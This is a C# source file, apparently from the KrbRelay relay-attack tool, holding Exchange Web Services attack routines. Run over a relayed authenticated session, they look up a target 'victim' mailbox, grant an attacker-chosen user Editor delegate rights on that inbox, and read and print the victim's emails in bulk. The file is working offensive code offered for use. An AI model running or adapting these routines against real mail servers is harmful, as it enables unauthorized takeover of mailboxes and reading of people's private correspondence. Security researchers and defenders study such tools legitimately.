using MimeKit;
using System;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Http;
using System.Text;
using System.Xml;
using System.Xml.Linq;

namespace KrbRelay.Clients.Attacks.Http
{
    internal class EWS
    {
        public static string exchangeVersion = "Exchange2013";

        public static string findMailbox(HttpClient httpClient, string user)
        {
            string soapRequestXML = String.Format(@"<?xml version=""1.0"" encoding=""utf-8"" ?>
<soap:Envelope xmlns:xsi=""http://www.w3.org/2001/XMLSchema-instance"" xmlns:m=""http://schemas.microsoft.com/exchange/services/2006/messages"" xmlns:t=""http://schemas.microsoft.com/exchange/services/2006/types"" xmlns:soap=""http://schemas.xmlsoap.org/soap/envelope/"" >
  <soap:Header>
    <t:RequestServerVersion Version=""{0}"" />
  </soap:Header>
  <soap:Body>
    <m:ResolveNames ReturnFullContactData=""false"" ContactDataShape=""Default"">
        <m:UnresolvedEntry>{1}</m:UnresolvedEntry>
    </m:ResolveNames>
  </soap:Body>
</soap:Envelope>", exchangeVersion, user); ;

            using (var message = new HttpRequestMessage(HttpMethod.Post, "EWS/Exchange.asmx"))
            {
                //message.RequestUri = new Uri("http://localhost");
                message.Headers.Add("User-Agent", "ExchangeServicesClient/15.0.913.15");
                message.Headers.Add("Accept", "text/xml");
                message.Headers.Add("Connection", "keep-alive");
                message.Content = new StringContent(soapRequestXML, Encoding.UTF8, "text/xml");
                message.Method = HttpMethod.Post;
                var result = httpClient.SendAsync(message).Result;
                if (result.StatusCode == HttpStatusCode.OK)
                {
                    string responseXml = result.Content.ReadAsStringAsync().GetAwaiter().GetResult();
                    var xml = XDocument.Parse(responseXml);
                    XmlDocument xdoc = new XmlDocument();
                    xdoc.LoadXml(responseXml);
                    var nsmgr = new XmlNamespaceManager(xdoc.NameTable);
                    nsmgr.AddNamespace("t", "http://schemas.microsoft.com/exchange/services/2006/types");
                    XmlNodeList list = xdoc.SelectNodes("//t:EmailAddress", nsmgr);

                    if (list[0] != null)
                    {
                        return list[0].InnerText;
                    }
                }
                return "";
            }
        }

        public static void delegateMailbox(HttpClient httpClient, string victim, string user)
        {
            string vEmail = findMailbox(httpClient, victim);
            if (string.IsNullOrEmpty(vEmail))
            {
                Console.WriteLine("[-] Could not find email for target user");
                return;
            }
            else
            {
                Console.WriteLine("[*] Found victim email: {0}", vEmail);
            }

            string soapRequestXML = string.Format(@"<?xml version=""1.0"" encoding=""utf-8"" ?>
<soap:Envelope xmlns:xsi=""http://www.w3.org/2001/XMLSchema-instance"" xmlns:m=""http://schemas.microsoft.com/exchange/services/2006/messages"" xmlns:t=""http://schemas.microsoft.com/exchange/services/2006/types"" xmlns:soap=""http://schemas.xmlsoap.org/soap/envelope/"" >
<soap:Header>
  <t:RequestServerVersion Version=""{0}"" />
</soap:Header>
<soap:Body>
  <m:AddDelegate>
	<m:Mailbox>
	  <t:EmailAddress>{1}</t:EmailAddress>
	</m:Mailbox>
	<m:DelegateUsers>
	  <t:DelegateUser>
		<t:UserId>
		  <t:PrimarySmtpAddress>{2}</t:PrimarySmtpAddress>
		</t:UserId>
		<t:DelegatePermissions>
		  <t:CalendarFolderPermissionLevel>None</t:CalendarFolderPermissionLevel>
		  <t:TasksFolderPermissionLevel>None</t:TasksFolderPermissionLevel>
		  <t:InboxFolderPermissionLevel>Editor</t:InboxFolderPermissionLevel>
		  <t:ContactsFolderPermissionLevel>None</t:ContactsFolderPermissionLevel>
		  <t:NotesFolderPermissionLevel>None</t:NotesFolderPermissionLevel>
		  <t:JournalFolderPermissionLevel>None</t:JournalFolderPermissionLevel>
		</t:DelegatePermissions>
		<t:ReceiveCopiesOfMeetingMessages>false</t:ReceiveCopiesOfMeetingMessages>
		<t:ViewPrivateItems>false</t:ViewPrivateItems>
	  </t:DelegateUser>
	</m:DelegateUsers>
	<m:DeliverMeetingRequests>DelegatesAndSendInformationToMe</m:DeliverMeetingRequests>
  </m:AddDelegate>
</soap:Body>
</soap:Envelope>", exchangeVersion, vEmail, user);

            using (var message = new HttpRequestMessage(HttpMethod.Post, "EWS/Exchange.asmx"))
            {
                //message.RequestUri = new Uri("http://localhost");
                message.Headers.Add("User-Agent", "ExchangeServicesClient/15.0.913.15");
                message.Headers.Add("Accept", "text/xml");
                message.Headers.Add("Connection", "keep-alive");
                message.Content = new StringContent(soapRequestXML, Encoding.UTF8, "text/xml");
                message.Method = HttpMethod.Post;
                var result = httpClient.SendAsync(message).Result;
                Console.WriteLine("[*] resp: " + result.StatusCode);
                if (result.StatusCode == HttpStatusCode.OK)
                {
                    Console.WriteLine(result.Content.ReadAsStringAsync().GetAwaiter().GetResult());
                }
            }
        }

        public static void readMailbox(HttpClient httpClient, string mailbox = "inbox", string filter = "", int limit = 100)
        {
            filter = filter.Replace(",", " OR ");
            string soapRequestXML = string.Format(@"<?xml version=""1.0"" encoding =""utf-8"" ?>
<soap:Envelope xmlns:xsi=""http://www.w3.org/2001/XMLSchema-instance"" xmlns:m=""http://schemas.microsoft.com/exchange/services/2006/messages"" xmlns:t=""http://schemas.microsoft.com/exchange/services/2006/types"" xmlns:soap=""http://schemas.xmlsoap.org/soap/envelope/"" >
<soap:Header>
  <t:RequestServerVersion Version=""{0}"" />
</soap:Header>
<soap:Body>
  <m:FindItem Traversal=""Shallow"" >
	<m:ItemShape>
	  <t:BaseShape>AllProperties</t:BaseShape>
	</m:ItemShape>
	<m:IndexedPageItemView MaxEntriesReturned=""{1}"" Offset=""0"" BasePoint=""Beginning"" />
	<m:ParentFolderIds>
	  <t:DistinguishedFolderId Id=""{2}"" />
	</m:ParentFolderIds>
    <m:QueryString>{3}</m:QueryString>
  </m:FindItem>
</soap:Body>
</soap:Envelope>", exchangeVersion, limit, mailbox, filter);

            using (var message = new HttpRequestMessage(HttpMethod.Post, "EWS/Exchange.asmx"))
            {
                //message.RequestUri = new Uri("http://localhost");
                message.Headers.Add("User-Agent", "ExchangeServicesClient/15.0.913.15");
                message.Headers.Add("Accept", "text/xml");
                message.Headers.Add("Connection", "keep-alive");
                message.Content = new StringContent(soapRequestXML, Encoding.UTF8, "text/xml");
                message.Method = HttpMethod.Post;
                var result = httpClient.SendAsync(message).Result;
                Console.WriteLine("[*] resp: " + result.StatusCode);
                if (result.StatusCode == HttpStatusCode.OK)
                {
                    string responseXml = result.Content.ReadAsStringAsync().GetAwaiter().GetResult();
                    //Console.WriteLine(responseXml);
                    var xml = XDocument.Parse(responseXml);
                    XmlDocument xdoc = new XmlDocument();
                    xdoc.LoadXml(responseXml);
                    var nsmgr = new XmlNamespaceManager(xdoc.NameTable);
                    nsmgr.AddNamespace("t", "http://schemas.microsoft.com/exchange/services/2006/types");
                    XmlNodeList list = xdoc.SelectNodes("//t:Message", nsmgr);

                    Console.WriteLine("[*] Searching in inbox");
                    Console.WriteLine();
                    for (int cc = 0; cc < list.Count; cc++)
                    {
                        XmlNode ItemId = list[cc].SelectNodes("//t:ItemId", nsmgr)[cc];
                        var email = readEmail(httpClient, ItemId.Attributes["Id"].Value, ItemId.Attributes["ChangeKey"].Value);

                        Console.WriteLine("Date:    {0}", email.Date);
                        Console.WriteLine("From:    {0}", email.From);
                        Console.WriteLine("Subject: {0}", email.Subject);
                        Console.WriteLine("Attachments: {0}", email.Attachments.Count());
                        Console.WriteLine("Body;\n{0}", email.TextBody);

                        Console.WriteLine("-----");
                    }
                }
            }
        }

        public static MimeMessage readEmail(HttpClient httpClient, string id, string changeKey)
        {
            string soapRequestXML = string.Format(@"<?xml version=""1.0"" encoding=""utf-8"" ?>
<soap:Envelope xmlns:xsi=""http://www.w3.org/2001/XMLSchema-instance"" xmlns:m=""http://schemas.microsoft.com/exchange/services/2006/messages"" xmlns:t=""http://schemas.microsoft.com/exchange/services/2006/types"" xmlns:soap=""http://schemas.xmlsoap.org/soap/envelope/"" >
<soap:Header>
  <t:RequestServerVersion Version=""{0}"" />
</soap:Header>
<soap:Body>
  <m:GetItem>
	<m:ItemShape>
	  <t:BaseShape>IdOnly</t:BaseShape>
	  <t:AdditionalProperties>
		<t:FieldURI FieldURI=""item:MimeContent"" />
	  </t:AdditionalProperties>
	</m:ItemShape>
	<m:ItemIds>
	  <t:ItemId Id=""{1}"" ChangeKey =""{2}"" />
	</m:ItemIds>
  </m:GetItem>
</soap:Body>
</soap:Envelope>", exchangeVersion, id, changeKey);

            using (var message = new HttpRequestMessage(HttpMethod.Post, "EWS/Exchange.asmx"))
            {
                //message.RequestUri = new Uri("http://localhost");
                message.Headers.Add("User-Agent", "ExchangeServicesClient/15.0.913.15");
                message.Headers.Add("Accept", "text/xml");
                message.Headers.Add("Connection", "keep-alive");
                message.Content = new StringContent(soapRequestXML, Encoding.UTF8, "text/xml");
                message.Method = HttpMethod.Post;
                var result = httpClient.SendAsync(message).Result;
                //Console.WriteLine("[*] resp: " + result.StatusCode);
                if (result.StatusCode == HttpStatusCode.OK)
                {
                    string responseXml = result.Content.ReadAsStringAsync().GetAwaiter().GetResult();
                    var xml = XDocument.Parse(responseXml);
                    XmlDocument xdoc = new XmlDocument();
                    xdoc.LoadXml(responseXml);
                    var nsmgr = new XmlNamespaceManager(xdoc.NameTable);
                    nsmgr.AddNamespace("t", "http://schemas.microsoft.com/exchange/services/2006/types");

                    XmlNodeList mimeXml = xdoc.SelectNodes("//t:MimeContent", nsmgr);
                    MimeMessage mm = new MimeMessage();
                    using (Stream stream = new MemoryStream(Convert.FromBase64String(mimeXml[0].InnerText)))
                    {
                        mm = MimeMessage.Load(stream);
                    }
                    return mm;
                }
                else
                {
                    return null;
                }
            }
        }
    }
}